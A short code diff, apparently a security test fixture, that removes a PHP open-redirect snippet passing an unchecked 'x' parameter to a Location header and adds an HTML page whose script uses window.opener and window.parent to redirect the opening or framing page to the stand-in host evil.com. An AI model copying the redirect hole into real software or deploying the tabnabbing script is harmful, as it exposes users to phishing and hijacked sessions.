@@ -1,4 +1,8 @@
-<?php
-$url = $_GET['x'];
-header("Location: $url");
-?> 
+<html>
+  <body>
+<script>
+if (window.opener) window.opener.parent.location.replace('http://evil.com');
+if (window.parent != window) window.parent.location.replace('http://evil.com');
+</script>
+  </body>
+</html>
